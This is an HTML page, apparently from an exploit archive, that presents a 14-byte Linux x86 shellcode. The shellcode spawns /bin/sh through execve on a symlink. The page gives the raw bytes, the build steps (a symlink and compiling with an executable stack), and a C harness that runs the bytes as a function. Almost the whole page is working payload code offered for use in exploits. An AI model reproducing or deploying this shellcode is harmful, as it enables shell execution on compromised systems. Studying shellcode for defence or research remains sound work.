<html><head><title>Linux/x86 - execve(a-&gt;/bin/sh) - 14 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
 
/*
    by Magnefikko
    17.04.2010
    magnefikko@gmail.com
    Promhyl Studies :: http://promhyl.oz.pl
    Subgroup: #PRekambr
    Name: 14 bytes execve(&quot;a-&gt;/bin/sh&quot;) local-only shellcode
    Platform: Linux x86
     
    execve(&quot;a&quot;, 0, 0);
 
    $ ln -s /bin/sh a
    $ gcc -Wl,-z,execstack filename.c
    $ ./a.out
     
    Link is required.
 
    shellcode:
 
\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80
 
*/
 
 
int main(){
    char shell[] = &quot;\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80&quot;;
    printf(&quot;by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n&quot;, strlen(shell));
    (*(void (*)()) shell)();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
